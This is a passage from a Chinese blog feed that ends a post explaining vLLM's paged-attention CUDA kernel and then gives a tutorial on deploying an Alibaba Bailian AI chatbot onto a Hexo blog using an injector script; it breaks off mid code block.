...<br>        accs[i] += <span class="hljs-built_in">dot</span>(logits_vec, v_vec);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从上面的代码可以看到，在外层循环，与 <code>k_ptr</code> 有些类似，<code>logits_vec</code> 会先读取不同 blocks 的 <code>logits</code> 数据，读取 <code>V_VEC_SIZE</code> 个元素用于内循环的计算。在内循环中，每个 thread 读取了 <code>V_VEC_SIZE</code> 个 token 的元素，存放在 <code>v_vec</code> 中，最后计算点乘。重要的是，每个内循环中，thread 会 load 相同 8 个 token 下的不同的注意力头元素。点乘计算出来的值会被累加到 <code>accs</code> 中。因此 <code>accs</code> 变量会被映射到对应 thread 的注意力头处。</p><p>还是上面的例子， <code>BLOCK_SIZE</code> 是 16，<code>V_VEC_SIZE</code> 是 8，每个 thread 会一次 load 8 个 value 数据给 8 个 tokens。这些数据是来自不同 token 。若 <code>HEAD_SIZE</code> 是 128，<code>WARP_SIZE</code> 是 32，那么对于每个内循环，一个 warp 会需要 load <code>WARP_SIZE * V_VEC_SIZE = 256</code> 个元素。这意味着这个 warp 总共需要 128 * 16 / 256 = 8 个内循环来计算整个 block 的 value 值。每个 thread 中的 <code>accs</code> 则会包含 8 个元素的相加，这 8 个元素是来自 8 个不同的注意力头位置，比如上面的图中， thread 0 的 <code>accs</code> 变量包含了 8 个元素，它们分别来自 0th, 32th … 224th 元素的注意力头，它们都会被累加起来并赋值给 8 个 tokens。</p><h1>LV</h1><p>现在，我们已经将每个 warp 这些点乘值累加起来，存放到 <code>accs</code> 中。下面我们要进一步累加这些 <code>accs</code> 值，并在一个 block 中累加给所有注意力头的位置。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NUM_ROWS_PER_THREAD; i++) &#123;<br>   <span class="hljs-type">float</span> acc = accs[i];<br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> mask = NUM_V_VECS_PER_ROW / <span class="hljs-number">2</span>; mask &gt;= <span class="hljs-number">1</span>; mask /= <span class="hljs-number">2</span>) &#123;<br>      acc += <span class="hljs-built_in">VLLM_SHFL_XOR_SYNC</span>(acc, mask);<br>   &#125;<br>   accs[i] = acc;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后，我们需要计算所有 warps 的 <code>acc</code> 的归一求和值，然后让每个 thread 都有注意力头位置处的 <code>accs</code> 的所有 context token 的最终求和值。注意，每个 thread 的 <code>accs</code> 变量仅保存了整个注意力头中部分元素的累加值。不过，经过上面的计算后，所有输出结果都会被计算出来，存放再不同线程的寄存器内存中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">float</span>* out_smem = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">float</span>*&gt;(shared_mem);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = NUM_WARPS; i &gt; <span class="hljs-number">1</span>; i /= <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-comment">// Upper warps write to shared memory.</span><br>    ...<br>        <span class="hljs-type">float</span>* dst = &amp;out_smem[(warp_idx - mid) * HEAD_SIZE];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NUM_ROWS_PER_THREAD; i++) &#123;<br>                ...<br>        dst[row_idx] = accs[i];<br>    &#125;<br><br>    <span class="hljs-comment">// Lower warps update the output.</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">float</span>* src = &amp;out_smem[warp_idx * HEAD_SIZE];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NUM_ROWS_PER_THREAD; i++) &#123;<br>                ...<br>        accs[i] += src[row_idx];<br>    &#125;<br>        <span class="hljs-comment">// Write out the accs.</span><br>&#125;<br></code></pre></td></tr></table></figure><h1>Output</h1><p>现在我们可以将计算得到的结果从寄存器内存中写到全局内存中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">scalar_t</span>* out_ptr = out + seq_idx * num_heads * max_num_partitions * HEAD_SIZE<br>                + head_idx * max_num_partitions * HEAD_SIZE<br>                + partition_idx * HEAD_SIZE;<br></code></pre></td></tr></table></figure><p>首先，我们需要定义 <code>out_ptr</code> 变量，它的地址取决于相关 sequence 和注意力头的起始地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NUM_ROWS_PER_THREAD; i++) &#123;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> row_idx = lane / NUM_V_VECS_PER_ROW + i * NUM_ROWS_PER_ITER;<br><span class="hljs-keyword">if</span> (row_idx &lt; HEAD_SIZE &amp;&amp; lane % NUM_V_VECS_PER_ROW == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">from_float</span>(*(out_ptr + row_idx), accs[i]);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后，我们需要循环多次，将不同的注意力头位置都写到相对应的累加结果上，并返回 <code>output_ptr</code>。</p><h1>VLLM 代码实现</h1><p>以 llama3-8b 为例，</p><h3 id="参数与数据结构">参数与数据结构</h3><p>参数解释与 llama3-8b 的相关数据情况：</p><table><thead><tr><th>参数</th><th>llama3-8b 中的值</th><th>描述</th></tr></thead><tbody><tr><td>num_seq</td><td>4(batch_size)</td><td>该推理中 sequence 个数</td></tr><tr><td>num_head</td><td>32</td><td>Query 的 head 个数</td></tr><tr><td>num_kv_heads</td><td>8</td><td>Key、Value 的 head 个数</td></tr><tr><td>hidden_size</td><td>4096</td><td>输入的嵌入张量维度</td></tr><tr><td>head_size</td><td>128</td><td>每个注意力头的维度大小</td></tr><tr><td>x</td><td>2(FP16)</td><td>数据类型的字节数</td></tr><tr><td>scaling</td><td>128^-0.5</td><td>注意力公式中的scale值</td></tr></tbody></table><p>Paged Attention 算法相关的辅助数据结构：</p><p>block_size KVCache page 的最高维，KVCache 是若干个 page 的集合，每个 page 存（block_size, num_head，head_size）个 K、V 的元素。<br>context_lens [num_seqs] 用于变长<br>max_num_blocks_per_seq<br>q_stride<br>kv_block_stride<br>kv_head_stride</p><p>q_vecs</p><p>head_mapping [num_heads] 用于 MQA, GQA，确定用的 KV_head</p><p>block_tables [num_seqs, max_num_blocks_per_seq] block_tables 映射表，表示每个 sequence 映射到哪几个 block 上</p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在基于 hexo 框架的博客上部署定制化 AI 聊天应用</title>
    <link href="/2024/07/21/2024-7-21-ai_assist/"/>
    <url>/2024/07/21/2024-7-21-ai_assist/</url>
    
    <content type="html"><![CDATA[<h1>需要</h1><ul><li>注册并登录<a href="https://help.aliyun.com/zh/model-studio/">大模型服务百炼平台</a>。注意，目前（2024年7月），在阿里云上部署 AI 助手需要根据 AI 应用的实际 token 输入/输出数量付费！</li></ul><p>友情链接：通义系列模型收费<a href="https://help.aliyun.com/zh/model-studio/product-overview/tongyi-qianwen-series-models-price-adjustment">价格一览</a></p><h1>部署方法</h1><p>如何给自己的博客加入 AI 助手，方便全天候（7x24）地回答读者疑问，总结文章内容？本篇博客教你用 10 分钟为您的网站添加一个 AI 助手。以下内容基本参考了<a href="https://help.aliyun.com/zh/model-studio/use-cases/add-an-ai-assistant-to-your-website-in-10-minutes?spm=a2c4g.11186623.0.0.5b796373rqgtsU">10分钟在网站上增加一个 AI 助手</a>。</p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816074.gif" alt=""></p><p>在网站中引入一个 AI 助手，只需 4 步：</p><ol><li><strong>创建大模型问答应用</strong>：我们将先通过百炼创建一个大模型应用，并获取调用大模型应用 API 的相关凭证。</li><li><strong>搭建示例网站</strong>：然后我们将通过函数计算，来快速搭建一个网站，模拟您的企业官网或者其他站点。</li><li><strong>引入 AI 助手</strong>：接着我们将通过修改几行代码，实现在网站中引入一个 AI 助手。</li><li><strong>增加私有知识</strong>：最后可以通过准备一些私有知识，让 AI 助理能回答原本无法准确回答的问题，帮助您更好的应对客户咨询。</li></ol><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816044.png" alt=""></p><h2 id="1-创建大模型问答应用">1. 创建大模型问答应用</h2><p>首先我们可以通过创建一个百炼应用，来获取大模型的推理 API 服务，用于实现 AI 助手。</p><blockquote><p>百炼提供的新用户免费额度可以完全覆盖本教程所需资源消耗。额度消耗完后按 token 计费，相比自行部署大模型可以显著降低初期投入成本。</p></blockquote><h3 id="1-1-创建应用">1.1 创建应用</h3><p>进入百炼控制台，在我的应用中点击创建应用。</p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816048.png" alt=""></p><p>在应用设置页面，模型选择通义千问-Plus，其他参数保持默认。</p><blockquote><p>您也可以选择输入一些 Prompt，比如设置一些人设以引导大模型更好的应对客户咨询。</p><p>比如，</p><p>“你是峰子乐园的管家，名字叫小峰。你是我（主人峰子）的个人博客助手。你负责对博客的文章内容做出总结概括，解答读者们提出的问题。”</p></blockquote><p>点击右上角发布，在页面右侧可以提问验证模型效果。不过您会发现，目前它还无法准确回答你的私有数据信息，毕竟模型还未获得咱们博客内的文章数据，我们将在后面的步骤中去解决这一问题。</p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816047.png" alt=""><br><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816045.png" alt=""></p><h3 id="1-2-获取调用-API-所需的凭证">1.2 获取调用 API 所需的凭证</h3><p>为了在后续通过 API 调用大模型应用的能力，我们需要获取一个百炼应用的 API-KEY 和应用 ID：</p><ol><li>在我的应用页面，点击查看我的API-KEY，在弹出窗口中创建一个新 API-KEY。</li></ol><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816049.png" alt=""></p><ol start="2"><li>在应用列表中可以查看所有百炼应用 ID</li></ol><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816050.png" alt=""></p><h2 id="2-搭建示例网站">2. 搭建示例网站</h2><p>在让 AI 助手能准确回答问题之前，我们可以先尝试快速将 AI 助手集成到网站中。</p><p>您可以通过我们提前准备好的应用模板，快速搭建一个空白的示例网站，用于模拟您的企业官网或者其他站点。详细步骤如下：</p><blockquote><p>函数计算提供的<a href="https://help.aliyun.com/zh/functioncompute/product-overview/trial-quota">免费试用额度</a>可以完全覆盖本教程所需资源消耗。额度消耗完后按量计费，对于本教程所涉及的 web 服务，只在有访问的情况下会产生费用。</p></blockquote><h3 id="2-1-创建应用">2.1 创建应用</h3><p>通过我们准备好的<a href="https://fcnext.console.aliyun.com/applications/create?template=web-chatbot">应用模板</a>，参考下图选择<strong>直接部署</strong>、并填写前面获取到的百炼应用 ID 以及 API-KEY。</p><p>然后其他表单项保持默认，点击页面左下角的<strong>创建并部署默认环境</strong>，等待项目部署完成即可（预计耗时 1 分钟）。</p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816052.png" alt=""></p><p>红框部分需要分别填写之前我们申请的百炼应用 ID 和 API-KEY，是因为我们预置的应用模板中包含了通过百炼应用调用大模型的代码，以便您在后续快速完成体验。</p><h3 id="2-2-访问网站">2.2 访问网站</h3><p>应用部署完成后，您可以在应用详情的<strong>环境信息</strong>中找到示例网站的访问域名，点击即可查看，确认示例网站已经部署成功。</p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816053.png" alt=""></p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816051.png" alt=""></p><h2 id="3-为网站增加-AI-助手">3. 为网站增加 AI 助手</h2><p>在网站中增加 AI 助手非常简单，您只需要在网站的 html 文件中插入几行代码。</p><h3 id="3-1-增加-AI-助手相关代码">3.1 增加 AI 助手相关代码</h3><p>示例工程中包含了被注释的引入 AI 助手代码，您需要找到并解除注释。详细操作步骤如下：</p><ol><li>回到应用详情页，在环境详情的最底部找到函数资源，点击函数名称，进入函数详情页。</li></ol><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816055.png" alt=""></p><ol start="2"><li>在函数详情页，参考下图打开代码视图，并找到public/index.html文件，然后取消③所在位置的代码注释即可。</li></ol><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816054.png" alt=""></p><ol start="3"><li>最后点击<strong>部署代码</strong>，等待部署完成即可。</li></ol><h3 id="3-2-验证网站上的-AI-助手">3.2 验证网站上的 AI 助手</h3><p>现在，您可以刷新示例网站页面以查看最新效果。此时您会发现网站的右下角出现了 AI 助手图标image.png，点击即可唤起 AI 助手。</p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816057.png" alt=""></p><h2 id="4-为-AI-助手增加私有知识">4. 为 AI 助手增加私有知识</h2><p>通过前面的步骤，您已经拥有了一个可以和客户对话的 AI 助手。但是，如果想让 AI 助手像你的博客助手一样，更加精准且专业地回答与博客文章相关的问题，我们还需要为大模型应用配置知识库。</p><p>假设您的博客文章包括了许多智能手机相关的知识。您的博客网站上会有很多与智能手机相关的信息，如支持双卡双待、屏幕、电池容量、内存等信息。不同机型的详细配置清单参考：<a href="https://help-static-aliyun-doc.aliyuncs.com/file-manage-files/zh-CN/20240701/geijms/%E7%99%BE%E7%82%BC%E7%B3%BB%E5%88%97%E6%89%8B%E6%9C%BA%E4%BA%A7%E5%93%81%E4%BB%8B%E7%BB%8D.docx">百炼系列手机产品介绍.docx</a>。</p><h3 id="4-1-配置知识库">4.1 配置知识库</h3><p>接下来，我们可以尝试让大模型在面对客户问题时参考这份文档，以产出一个更准确的回答和建议。</p><p><strong>上传文件</strong>：在百炼控制台的<a href="https://bailian.console.aliyun.com/data-center#/data-center">数据管理</a>中点击<strong>导入数据</strong>，根据引导上传我们虚构的百炼系列手机产品介绍：</p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816058.png" alt=""></p><p><strong>建立索引</strong>：在左侧菜单中找到<a href="https://bailian.console.aliyun.com//knowledge-base#/knowledge-base">知识索引</a>，根据引导创建一个新的知识库，选择向量存储类型，并选择刚才上传的文件，其他参数保持默认即可。知识库将为上一步骤中准备的文档建立索引，以便后续大模型回答时检索参考。</p><blockquote><p>选择向量存储类型时，如果您希望集中存储、灵活管理多个应用的向量数据，可选择ADB-PG。</p></blockquote><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816059.png" alt=""></p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8243531271/p822476.png" alt=""></p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816061.png" alt=""></p><p><strong>引用知识</strong>：完成知识库的创建后，返回应用设置，打开知识检索增强开关、选择知识库，最后点击发布。Prompt 中会被自动添加一段信息，以便大模型在后续回答时参考检索出来的信息。</p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816060.png" alt=""></p><h3 id="4-2-检验效果">4.2 检验效果</h3><p>有了参考知识，AI 助手就能准确回答关于您公司的商品的问题了。</p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816109.png" alt=""></p><h2 id="总结">总结</h2><p>通过前面的学习，您已经能搭建一个大模型 RAG 应用，并且将其以 AI 助手的形式添加到网站中来应对客户咨询，过程仅需 0 元（免费试用额度内） 10 分钟。</p><h3 id="应用于生产环境">应用于生产环境</h3><p>在正式的将 AI 助手引入到您的生产环境之前，建议您了解如下信息：</p><h4 id="前端代码">前端代码</h4><p>前面创建的网站 AI 助手，是基于NLUX（一个用于开发大模型对话机器人的前端库）开发的示例，功能还比较简单。</p><p>如果您对于 AI 助理有更多定制化的需求，如希望调整样式、支持历史会话管理等，可以参考 <a href="https://docs.nlkit.com/nlux/learn/overview">NLUX 的文档</a>进行定制开发。</p><p>参考：定制前端组件的样式和内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">crossorigin</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://g.alicdn.com/aliyun-documentation/web-chatbot-ui/0.0.11/index.css&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;module&quot;</span> <span class="hljs-attr">crossorigin</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://g.alicdn.com/aliyun-documentation/web-chatbot-ui/0.0.11/index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-variable language_">window</span>.<span class="hljs-property">CHATBOT_CONFIG</span> = &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">endpoint</span>: <span class="hljs-string">&quot;/chat&quot;</span>, <span class="hljs-comment">// 可以替换为 https://&#123;your-fc-http-trigger-domain&#125;/chat</span></span><br><span class="language-javascript">    <span class="hljs-attr">displayByDefault</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 默认不展示 AI 助手聊天框</span></span><br><span class="language-javascript">    <span class="hljs-attr">aiChatOptions</span>: &#123; <span class="hljs-comment">// aiChatOptions 中 options 会传递 aiChat 组件，自定义取值参考：https://docs.nlkit.com/nlux/reference/ui/ai-chat</span></span><br><span class="language-javascript">      <span class="hljs-attr">conversationOptions</span>: &#123; <span class="hljs-comment">// 自定义取值参考：https://docs.nlkit.com/nlux/reference/ui/ai-chat#conversation-options</span></span><br><span class="language-javascript">        <span class="hljs-attr">conversationStarters</span>: [</span><br><span class="language-javascript">          &#123;<span class="hljs-attr">prompt</span>: <span class="hljs-string">&#x27;哪款手机续航最长？&#x27;</span>&#125;,</span><br><span class="language-javascript">          &#123;<span class="hljs-attr">prompt</span>: <span class="hljs-string">&#x27;你们有哪些手机型号？&#x27;</span>&#125;,</span><br><span class="language-javascript">          &#123;<span class="hljs-attr">prompt</span>: <span class="hljs-string">&#x27;有折叠屏手机吗?&#x27;</span>&#125;,</span><br><span class="language-javascript">        ]</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-attr">displayOptions</span>: &#123; <span class="hljs-comment">// 自定义取值参考：https://docs.nlkit.com/nlux/reference/ui/ai-chat#display-options</span></span><br><span class="language-javascript">        <span class="hljs-attr">height</span>: <span class="hljs-number">600</span>,</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-attr">personaOptions</span>: &#123; <span class="hljs-comment">// 自定义取值参考：https://docs.nlkit.com/nlux/reference/ui/ai-chat#chat-personas</span></span><br><span class="language-javascript">        <span class="hljs-attr">assistant</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;你好，我是你的 AI 助手&#x27;</span>,</span><br><span class="language-javascript">          <span class="hljs-comment">// AI 助手的图标</span></span><br><span class="language-javascript">          <span class="hljs-attr">avatar</span>: <span class="hljs-string">&#x27;https://img.alicdn.com/imgextra/i2/O1CN01Pda9nq1YDV0mnZ31H_!!6000000003025-54-tps-120-120.apng&#x27;</span>,</span><br><span class="language-javascript">          <span class="hljs-attr">tagline</span>: <span class="hljs-string">&#x27;您可以尝试点击下方的快捷入口开启体验！&#x27;</span>,</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-pseudo">:root</span> &#123;</span><br><span class="language-css">    <span class="hljs-comment">/* webchat 工具栏的颜色 */</span></span><br><span class="language-css">    <span class="hljs-attr">--webchat-toolbar-background-color</span>: <span class="hljs-number">#1464E4</span>;</span><br><span class="language-css">    <span class="hljs-comment">/* webchat 工具栏文字和按钮的颜色 */</span></span><br><span class="language-css">    <span class="hljs-attr">--webchat-toolbar-text-color</span>: <span class="hljs-number">#FFF</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css">  <span class="hljs-comment">/* webchat 对话框如果被遮挡，可以尝试通过 z-index、bottom、right 等设置来调整位置 */</span></span><br><span class="language-css">  <span class="hljs-selector-class">.webchat-container</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;</span><br><span class="language-css">    <span class="hljs-attribute">bottom</span>: <span class="hljs-number">10px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">right</span>: <span class="hljs-number">10px</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css">  <span class="hljs-comment">/* webchat 的唤起按钮如果被遮挡，可以尝试通过 z-index、bottom、right 等设置来调整位置 */</span></span><br><span class="language-css">  <span class="hljs-selector-class">.webchat-bubble-tip</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">z-index</span>: <span class="hljs-number">99</span>;</span><br><span class="language-css">    <span class="hljs-attribute">bottom</span>: <span class="hljs-number">20px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">right</span>: <span class="hljs-number">20px</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="服务端代码">服务端代码</h4><p>前面创建的示例网站代码中，包含了一个调用大模型获取答案的接口 <code>POST /chat</code> ，具体实现代码在文件 <code>index.js</code> 中。</p><blockquote><p>函数计算应用在没有访问时不产生任何费用，您完全可以保留此函数应用，在后续用作调用大模型的转发服务。</p></blockquote><p>函数计算应用部署时附带的 **.devsapp.net 域名会在下发后 30 天内回收，且不支持 https 访问，只适合于测试验证。如果您希望在您的网站上直接调用函数计算中部署的 <code>POST /chat</code> 接口，建议使用函数计算 http 触发器中提供的域名，如：<code>https://web-chat****.fcapp.run/chat</code>。与此同时，建议您修改index.js中的 cors 配置，禁止其他站点对此接口的访问。</p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/2542880271/p820673.png" alt=""></p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/2542880271/p820675.png" alt=""></p><h4 id="应用评测">应用评测</h4><p>建议在正式上线 AI 助手前，组织业务人员一起参与<a href="https://help.aliyun.com/zh/model-studio/user-guide/evaluate-application/">应用评测</a>，确保大模型应用的回答效果符合预期。如果不符合预期，可以通过<a href="https://edu.aliyun.com/course/3126500/lesson/342551535">优化提示词</a>、完善补充私有知识、调整文档切分策略等方法来改进回答效果。</p><h1>如何部署到基于 hexo 框架的博客上</h1><h2 id="hexo-注入器">hexo 注入器</h2><p>沿着上面的部署方法，如果顺利的话，可以将 AI 助手部署在示例的网站上。</p><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/8936289171/p816057.png" alt=""></p><p>但这不是我们需要的，我们最终是要把它放在我们的博客上供读者使用的！</p><p>因此，我们需要用到 hexo 框架内的<a href="https://hexo.fluid-dev.com/docs/advance/#hexo-%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81">注入器</a>来帮助我们将阿里云提供的前端代码注入到我们的博客网页上。</p><p>Hexo 注入器是 Hexo 5 版本自身加入的一项新功能，所以在所有 Hexo 主题都是支持这个功能的。</p><p>注入器可以将 HTML 片段注入生成页面的 &lt;head&gt; 和 &lt;body&gt; 节点中。我们可以利用注入器将 AI 助手的前端代码注入到博客的所有 html 中。</p><h2 id="编写-js-文件">编写 js 文件</h2><p>在实际使用中，建议将 js 代码独立成为 js 文件，存放在博客的 scripts 目录下，hexo 框架会自动识别该文件夹内部的 js 文件，然后编译执行</p><p>例如创建一个 /scripts/injector.js ，并写入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">hexo.<span class="hljs-property">extend</span>.<span class="hljs-property">injector</span>.<span class="hljs-title function_">register</span>(<span class="hljs-string">&#x27;body_end&#x27;</span>,<span class="hljs-string">`</span><br><span class="hljs-string">`</span><br>);<br></code></pre></td></tr></table></figure><p>显然，我们希望 AI 助手能在我们博客的任何文章中出现，因此，我们在每个博客的 body 结尾部分插入 AI 助手的前端代码。</p><p>但不是简单地将前面的 html 示例代码复制下来就完事了！</p><p>注意⚠️ <code>window.CHATBOT_CONFIG</code> 内的 <code>endpoint</code> 需要替换为 <code>https://&#123;your-fc-http-trigger-domain&#125;/chat</code>，否则我们的 AI 助手前端无法完成与阿里云上的后端 API 连接。</p><p>当然，前端代码还需要改很多地方来美化界面，完善用户人机交流体验，但上面这点是最重要的，一定要改。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs js">hexo.<span class="hljs-property">extend</span>.<span class="hljs-property">injector</span>.<span class="hljs-title function_">register</span>(<span class="hljs-string">&#x27;body_end&#x27;</span>,<span class="hljs-string">`</span><br><span class="hljs-string">&lt;link rel=&quot;stylesheet&quot; crossorigin href=&quot;https://g.alicdn.com/aliyun-documentation/web-chatbot-ui/0.0.11/index.css&quot; /&gt;</span><br><span class="hljs-string">&lt;script type=&quot;module&quot; crossorigin src=&quot;https://g.alicdn.com/aliyun-documentation/web-chatbot-ui/0.0.11/index.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string">  window.CHATBOT_CONFIG = &#123;</span><br><span class="hljs-string">    endpoint: &quot;/chat&quot;, // 可以替换为 https://&#123;your-fc-http-trigger-domain&#125;/chat</span><br><span class="hljs-string">    displayByDefault: false, // 默认不展示 AI 助手聊天框</span><br><span class="hljs-string">    aiChatOptions: &#123; // aiChatOptions 中 options 会传递 aiChat 组件，自定义取值参考：https://docs.nlkit.com/nlux/reference/ui/ai-chat</span><br><span class="hljs-string">      conversationOptions: &#123; // 